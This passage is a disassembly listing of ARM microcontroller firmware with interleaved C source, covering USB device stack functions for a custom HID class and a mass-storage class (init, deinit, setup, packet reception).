 8008bc2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bc6:	687b      	ldr	r3, [r7, #4]
 8008bc8:	32b0      	adds	r2, #176	; 0xb0
 8008bca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bce:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008bd0:	687b      	ldr	r3, [r7, #4]
 8008bd2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008bd6:	687a      	ldr	r2, [r7, #4]
 8008bd8:	33b0      	adds	r3, #176	; 0xb0
 8008bda:	009b      	lsls	r3, r3, #2
 8008bdc:	4413      	add	r3, r2
 8008bde:	685b      	ldr	r3, [r3, #4]
 8008be0:	68db      	ldr	r3, [r3, #12]
 8008be2:	68fa      	ldr	r2, [r7, #12]
 8008be4:	7810      	ldrb	r0, [r2, #0]
 8008be6:	68fa      	ldr	r2, [r7, #12]
 8008be8:	7852      	ldrb	r2, [r2, #1]
 8008bea:	4611      	mov	r1, r2
 8008bec:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008bee:	2300      	movs	r3, #0
}
 8008bf0:	4618      	mov	r0, r3
 8008bf2:	3710      	adds	r7, #16
 8008bf4:	46bd      	mov	sp, r7
 8008bf6:	bd80      	pop	{r7, pc}

08008bf8 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008bf8:	b580      	push	{r7, lr}
 8008bfa:	b084      	sub	sp, #16
 8008bfc:	af00      	add	r7, sp, #0
 8008bfe:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008c00:	687b      	ldr	r3, [r7, #4]
 8008c02:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c06:	687b      	ldr	r3, [r7, #4]
 8008c08:	32b0      	adds	r2, #176	; 0xb0
 8008c0a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c0e:	2b00      	cmp	r3, #0
 8008c10:	d101      	bne.n	8008c16 <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008c12:	2303      	movs	r3, #3
 8008c14:	e01c      	b.n	8008c50 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c16:	687b      	ldr	r3, [r7, #4]
 8008c18:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c1c:	687b      	ldr	r3, [r7, #4]
 8008c1e:	32b0      	adds	r2, #176	; 0xb0
 8008c20:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c24:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008c26:	4b0c      	ldr	r3, [pc, #48]	; (8008c58 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c28:	7819      	ldrb	r1, [r3, #0]
 8008c2a:	68fa      	ldr	r2, [r7, #12]
 8008c2c:	230f      	movs	r3, #15
 8008c2e:	6878      	ldr	r0, [r7, #4]
 8008c30:	f004 f920 	bl	800ce74 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c34:	68fb      	ldr	r3, [r7, #12]
 8008c36:	781a      	ldrb	r2, [r3, #0]
 8008c38:	4b08      	ldr	r3, [pc, #32]	; (8008c5c <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c3a:	701a      	strb	r2, [r3, #0]
 8008c3c:	4b07      	ldr	r3, [pc, #28]	; (8008c5c <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c3e:	781b      	ldrb	r3, [r3, #0]
 8008c40:	f003 0302 	and.w	r3, r3, #2
 8008c44:	2b02      	cmp	r3, #2
 8008c46:	d002      	beq.n	8008c4e <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008c48:	4b05      	ldr	r3, [pc, #20]	; (8008c60 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008c4a:	2201      	movs	r2, #1
 8008c4c:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008c4e:	2300      	movs	r3, #0
}
 8008c50:	4618      	mov	r0, r3
 8008c52:	3710      	adds	r7, #16
 8008c54:	46bd      	mov	sp, r7
 8008c56:	bd80      	pop	{r7, pc}
 8008c58:	200000a7 	.word	0x200000a7
 8008c5c:	2000026c 	.word	0x2000026c
 8008c60:	20000270 	.word	0x20000270

08008c64 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008c64:	b580      	push	{r7, lr}
 8008c66:	b084      	sub	sp, #16
 8008c68:	af00      	add	r7, sp, #0
 8008c6a:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c6c:	687b      	ldr	r3, [r7, #4]
 8008c6e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c72:	687b      	ldr	r3, [r7, #4]
 8008c74:	32b0      	adds	r2, #176	; 0xb0
 8008c76:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c7a:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008c7c:	68fb      	ldr	r3, [r7, #12]
 8008c7e:	2b00      	cmp	r3, #0
 8008c80:	d101      	bne.n	8008c86 <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c82:	2303      	movs	r3, #3
 8008c84:	e016      	b.n	8008cb4 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008c86:	68fb      	ldr	r3, [r7, #12]
 8008c88:	69db      	ldr	r3, [r3, #28]
 8008c8a:	2b01      	cmp	r3, #1
 8008c8c:	d111      	bne.n	8008cb2 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c8e:	687b      	ldr	r3, [r7, #4]
 8008c90:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c94:	687a      	ldr	r2, [r7, #4]
 8008c96:	33b0      	adds	r3, #176	; 0xb0
 8008c98:	009b      	lsls	r3, r3, #2
 8008c9a:	4413      	add	r3, r2
 8008c9c:	685b      	ldr	r3, [r3, #4]
 8008c9e:	68db      	ldr	r3, [r3, #12]
 8008ca0:	68fa      	ldr	r2, [r7, #12]
 8008ca2:	7810      	ldrb	r0, [r2, #0]
 8008ca4:	68fa      	ldr	r2, [r7, #12]
 8008ca6:	7852      	ldrb	r2, [r2, #1]
 8008ca8:	4611      	mov	r1, r2
 8008caa:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008cac:	68fb      	ldr	r3, [r7, #12]
 8008cae:	2200      	movs	r2, #0
 8008cb0:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008cb2:	2300      	movs	r3, #0
}
 8008cb4:	4618      	mov	r0, r3
 8008cb6:	3710      	adds	r7, #16
 8008cb8:	46bd      	mov	sp, r7
 8008cba:	bd80      	pop	{r7, pc}

08008cbc <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008cbc:	b480      	push	{r7}
 8008cbe:	b083      	sub	sp, #12
 8008cc0:	af00      	add	r7, sp, #0
 8008cc2:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008cc4:	687b      	ldr	r3, [r7, #4]
 8008cc6:	220a      	movs	r2, #10
 8008cc8:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008cca:	4b03      	ldr	r3, [pc, #12]	; (8008cd8 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008ccc:	4618      	mov	r0, r3
 8008cce:	370c      	adds	r7, #12
 8008cd0:	46bd      	mov	sp, r7
 8008cd2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008cd6:	4770      	bx	lr
 8008cd8:	2000009c 	.word	0x2000009c

08008cdc <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008cdc:	b480      	push	{r7}
 8008cde:	b083      	sub	sp, #12
 8008ce0:	af00      	add	r7, sp, #0
 8008ce2:	6078      	str	r0, [r7, #4]
 8008ce4:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008ce6:	683b      	ldr	r3, [r7, #0]
 8008ce8:	2b00      	cmp	r3, #0
 8008cea:	d101      	bne.n	8008cf0 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008cec:	2303      	movs	r3, #3
 8008cee:	e009      	b.n	8008d04 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008cf0:	687b      	ldr	r3, [r7, #4]
 8008cf2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cf6:	687a      	ldr	r2, [r7, #4]
 8008cf8:	33b0      	adds	r3, #176	; 0xb0
 8008cfa:	009b      	lsls	r3, r3, #2
 8008cfc:	4413      	add	r3, r2
 8008cfe:	683a      	ldr	r2, [r7, #0]
 8008d00:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008d02:	2300      	movs	r3, #0
}
 8008d04:	4618      	mov	r0, r3
 8008d06:	370c      	adds	r7, #12
 8008d08:	46bd      	mov	sp, r7
 8008d0a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d0e:	4770      	bx	lr

08008d10 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008d10:	b580      	push	{r7, lr}
 8008d12:	b084      	sub	sp, #16
 8008d14:	af00      	add	r7, sp, #0
 8008d16:	6078      	str	r0, [r7, #4]
 8008d18:	460b      	mov	r3, r1
 8008d1a:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008d1c:	f241 0074 	movw	r0, #4212	; 0x1074
 8008d20:	f004 f938 	bl	800cf94 <USBD_static_malloc_MSC>
 8008d24:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008d26:	68fb      	ldr	r3, [r7, #12]
 8008d28:	2b00      	cmp	r3, #0
 8008d2a:	d109      	bne.n	8008d40 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d2c:	687b      	ldr	r3, [r7, #4]
 8008d2e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d32:	687b      	ldr	r3, [r7, #4]
 8008d34:	32b0      	adds	r2, #176	; 0xb0
 8008d36:	2100      	movs	r1, #0
 8008d38:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008d3c:	2302      	movs	r3, #2
 8008d3e:	e06e      	b.n	8008e1e <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008d40:	687b      	ldr	r3, [r7, #4]
 8008d42:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d46:	687b      	ldr	r3, [r7, #4]
 8008d48:	32b0      	adds	r2, #176	; 0xb0
 8008d4a:	68f9      	ldr	r1, [r7, #12]
 8008d4c:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008d50:	687b      	ldr	r3, [r7, #4]
 8008d52:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d56:	687b      	ldr	r3, [r7, #4]
 8008d58:	32b0      	adds	r2, #176	; 0xb0
 8008d5a:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008d5e:	687b      	ldr	r3, [r7, #4]
 8008d60:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008d64:	687b      	ldr	r3, [r7, #4]
 8008d66:	7c1b      	ldrb	r3, [r3, #16]
 8008d68:	2b00      	cmp	r3, #0
 8008d6a:	d12b      	bne.n	8008dc4 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d6c:	4b2e      	ldr	r3, [pc, #184]	; (8008e28 <USBD_MSC_Init+0x118>)
 8008d6e:	7819      	ldrb	r1, [r3, #0]
 8008d70:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d74:	2202      	movs	r2, #2
 8008d76:	6878      	ldr	r0, [r7, #4]
 8008d78:	f003 feca 	bl	800cb10 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008d7c:	4b2a      	ldr	r3, [pc, #168]	; (8008e28 <USBD_MSC_Init+0x118>)
 8008d7e:	781b      	ldrb	r3, [r3, #0]
 8008d80:	f003 020f 	and.w	r2, r3, #15
 8008d84:	6879      	ldr	r1, [r7, #4]
 8008d86:	4613      	mov	r3, r2
 8008d88:	009b      	lsls	r3, r3, #2
 8008d8a:	4413      	add	r3, r2
 8008d8c:	009b      	lsls	r3, r3, #2
 8008d8e:	440b      	add	r3, r1
 8008d90:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008d94:	2201      	movs	r2, #1
 8008d96:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d98:	4b24      	ldr	r3, [pc, #144]	; (8008e2c <USBD_MSC_Init+0x11c>)
 8008d9a:	7819      	ldrb	r1, [r3, #0]
 8008d9c:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008da0:	2202      	movs	r2, #2
 8008da2:	6878      	ldr	r0, [r7, #4]
 8008da4:	f003 feb4 	bl	800cb10 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008da8:	4b20      	ldr	r3, [pc, #128]	; (8008e2c <USBD_MSC_Init+0x11c>)
 8008daa:	781b      	ldrb	r3, [r3, #0]
 8008dac:	f003 020f 	and.w	r2, r3, #15
 8008db0:	6879      	ldr	r1, [r7, #4]
 8008db2:	4613      	mov	r3, r2
 8008db4:	009b      	lsls	r3, r3, #2
 8008db6:	4413      	add	r3, r2
 8008db8:	009b      	lsls	r3, r3, #2
 8008dba:	440b      	add	r3, r1
 8008dbc:	3324      	adds	r3, #36	; 0x24
 8008dbe:	2201      	movs	r2, #1
 8008dc0:	801a      	strh	r2, [r3, #0]
 8008dc2:	e028      	b.n	8008e16 <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008dc4:	4b18      	ldr	r3, [pc, #96]	; (8008e28 <USBD_MSC_Init+0x118>)
 8008dc6:	7819      	ldrb	r1, [r3, #0]
 8008dc8:	2340      	movs	r3, #64	; 0x40
 8008dca:	2202      	movs	r2, #2
 8008dcc:	6878      	ldr	r0, [r7, #4]
 8008dce:	f003 fe9f 	bl	800cb10 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008dd2:	4b15      	ldr	r3, [pc, #84]	; (8008e28 <USBD_MSC_Init+0x118>)
 8008dd4:	781b      	ldrb	r3, [r3, #0]
 8008dd6:	f003 020f 	and.w	r2, r3, #15
 8008dda:	6879      	ldr	r1, [r7, #4]
 8008ddc:	4613      	mov	r3, r2
 8008dde:	009b      	lsls	r3, r3, #2
 8008de0:	4413      	add	r3, r2
 8008de2:	009b      	lsls	r3, r3, #2
 8008de4:	440b      	add	r3, r1
 8008de6:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008dea:	2201      	movs	r2, #1
 8008dec:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008dee:	4b0f      	ldr	r3, [pc, #60]	; (8008e2c <USBD_MSC_Init+0x11c>)
 8008df0:	7819      	ldrb	r1, [r3, #0]
 8008df2:	2340      	movs	r3, #64	; 0x40
 8008df4:	2202      	movs	r2, #2
 8008df6:	6878      	ldr	r0, [r7, #4]
 8008df8:	f003 fe8a 	bl	800cb10 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008dfc:	4b0b      	ldr	r3, [pc, #44]	; (8008e2c <USBD_MSC_Init+0x11c>)
 8008dfe:	781b      	ldrb	r3, [r3, #0]
 8008e00:	f003 020f 	and.w	r2, r3, #15
 8008e04:	6879      	ldr	r1, [r7, #4]
 8008e06:	4613      	mov	r3, r2
 8008e08:	009b      	lsls	r3, r3, #2
 8008e0a:	4413      	add	r3, r2
 8008e0c:	009b      	lsls	r3, r3, #2
 8008e0e:	440b      	add	r3, r1
 8008e10:	3324      	adds	r3, #36	; 0x24
 8008e12:	2201      	movs	r2, #1
 8008e14:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008e16:	6878      	ldr	r0, [r7, #4]
 8008e18:	f000 fa2c 	bl	8009274 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008e1c:	2300      	movs	r3, #0
}
 8008e1e:	4618      	mov	r0, r3
 8008e20:	3710      	adds	r7, #16
 8008e22:	46bd      	mov	sp, r7
 8008e24:	bd80      	pop	{r7, pc}
 8008e26:	bf00      	nop
 8008e28:	2000010b 	.word	0x2000010b
 8008e2c:	2000010a 	.word	0x2000010a

08008e30 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e30:	b580      	push	{r7, lr}
 8008e32:	b082      	sub	sp, #8
 8008e34:	af00      	add	r7, sp, #0
 8008e36:	6078      	str	r0, [r7, #4]
 8008e38:	460b      	mov	r3, r1
 8008e3a:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008e3c:	4b26      	ldr	r3, [pc, #152]	; (8008ed8 <USBD_MSC_DeInit+0xa8>)
 8008e3e:	781b      	ldrb	r3, [r3, #0]
 8008e40:	4619      	mov	r1, r3
 8008e42:	6878      	ldr	r0, [r7, #4]
 8008e44:	f003 fea2 	bl	800cb8c <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008e48:	4b23      	ldr	r3, [pc, #140]	; (8008ed8 <USBD_MSC_DeInit+0xa8>)
 8008e4a:	781b      	ldrb	r3, [r3, #0]
 8008e4c:	f003 020f 	and.w	r2, r3, #15
 8008e50:	6879      	ldr	r1, [r7, #4]
 8008e52:	4613      	mov	r3, r2
 8008e54:	009b      	lsls	r3, r3, #2
 8008e56:	4413      	add	r3, r2
 8008e58:	009b      	lsls	r3, r3, #2
 8008e5a:	440b      	add	r3, r1
 8008e5c:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e60:	2200      	movs	r2, #0
 8008e62:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008e64:	4b1d      	ldr	r3, [pc, #116]	; (8008edc <USBD_MSC_DeInit+0xac>)
 8008e66:	781b      	ldrb	r3, [r3, #0]
 8008e68:	4619      	mov	r1, r3
 8008e6a:	6878      	ldr	r0, [r7, #4]
 8008e6c:	f003 fe8e 	bl	800cb8c <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008e70:	4b1a      	ldr	r3, [pc, #104]	; (8008edc <USBD_MSC_DeInit+0xac>)
 8008e72:	781b      	ldrb	r3, [r3, #0]
 8008e74:	f003 020f 	and.w	r2, r3, #15
 8008e78:	6879      	ldr	r1, [r7, #4]
 8008e7a:	4613      	mov	r3, r2
 8008e7c:	009b      	lsls	r3, r3, #2
 8008e7e:	4413      	add	r3, r2
 8008e80:	009b      	lsls	r3, r3, #2
 8008e82:	440b      	add	r3, r1
 8008e84:	3324      	adds	r3, #36	; 0x24
 8008e86:	2200      	movs	r2, #0
 8008e88:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008e8a:	687b      	ldr	r3, [r7, #4]
 8008e8c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e90:	687b      	ldr	r3, [r7, #4]
 8008e92:	32b0      	adds	r2, #176	; 0xb0
 8008e94:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e98:	2b00      	cmp	r3, #0
 8008e9a:	d018      	beq.n	8008ece <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008e9c:	6878      	ldr	r0, [r7, #4]
 8008e9e:	f000 fa6f 	bl	8009380 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008ea2:	687b      	ldr	r3, [r7, #4]
 8008ea4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ea8:	687b      	ldr	r3, [r7, #4]
 8008eaa:	32b0      	adds	r2, #176	; 0xb0
 8008eac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008eb0:	4618      	mov	r0, r3
 8008eb2:	f004 f87d 	bl	800cfb0 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008eb6:	687b      	ldr	r3, [r7, #4]
 8008eb8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ebc:	687b      	ldr	r3, [r7, #4]
 8008ebe:	32b0      	adds	r2, #176	; 0xb0
 8008ec0:	2100      	movs	r1, #0
 8008ec2:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008ec6:	687b      	ldr	r3, [r7, #4]
 8008ec8:	2200      	movs	r2, #0
 8008eca:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008ece:	2300      	movs	r3, #0
}
 8008ed0:	4618      	mov	r0, r3
 8008ed2:	3708      	adds	r7, #8
 8008ed4:	46bd      	mov	sp, r7
 8008ed6:	bd80      	pop	{r7, pc}
 8008ed8:	2000010b 	.word	0x2000010b
 8008edc:	2000010a 	.word	0x2000010a

08008ee0 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008ee0:	b580      	push	{r7, lr}
 8008ee2:	b086      	sub	sp, #24
 8008ee4:	af00      	add	r7, sp, #0
 8008ee6:	6078      	str	r0, [r7, #4]
 8008ee8:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008eea:	687b      	ldr	r3, [r7, #4]
 8008eec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ef0:	687b      	ldr	r3, [r7, #4]
 8008ef2:	32b0      	adds	r2, #176	; 0xb0
 8008ef4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ef8:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008efa:	2300      	movs	r3, #0
 8008efc:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008efe:	2300      	movs	r3, #0
 8008f00:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008f02:	693b      	ldr	r3, [r7, #16]
 8008f04:	2b00      	cmp	r3, #0
 8008f06:	d101      	bne.n	8008f0c <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008f08:	2303      	movs	r3, #3
 8008f0a:	e0e1      	b.n	80090d0 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008f0c:	683b      	ldr	r3, [r7, #0]
 8008f0e:	781b      	ldrb	r3, [r3, #0]
 8008f10:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008f14:	2b00      	cmp	r3, #0
 8008f16:	d053      	beq.n	8008fc0 <USBD_MSC_Setup+0xe0>
 8008f18:	2b20      	cmp	r3, #32
 8008f1a:	f040 80d1 	bne.w	80090c0 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008f1e:	683b      	ldr	r3, [r7, #0]
 8008f20:	785b      	ldrb	r3, [r3, #1]
 8008f22:	2bfe      	cmp	r3, #254	; 0xfe
 8008f24:	d002      	beq.n	8008f2c <USBD_MSC_Setup+0x4c>
 8008f26:	2bff      	cmp	r3, #255	; 0xff
 8008f28:	d02a      	beq.n	8008f80 <USBD_MSC_Setup+0xa0>
 8008f2a:	e041      	b.n	8008fb0 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f2c:	683b      	ldr	r3, [r7, #0]
 8008f2e:	885b      	ldrh	r3, [r3, #2]
 8008f30:	2b00      	cmp	r3, #0
 8008f32:	d11e      	bne.n	8008f72 <USBD_MSC_Setup+0x92>
 8008f34:	683b      	ldr	r3, [r7, #0]
 8008f36:	88db      	ldrh	r3, [r3, #6]
 8008f38:	2b01      	cmp	r3, #1
 8008f3a:	d11a      	bne.n	8008f72 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008f3c:	683b      	ldr	r3, [r7, #0]
 8008f3e:	781b      	ldrb	r3, [r3, #0]
 8008f40:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f42:	2b00      	cmp	r3, #0
 8008f44:	da15      	bge.n	8008f72 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008f46:	687b      	ldr	r3, [r7, #4]
 8008f48:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f4c:	687a      	ldr	r2, [r7, #4]
 8008f4e:	33b0      	adds	r3, #176	; 0xb0
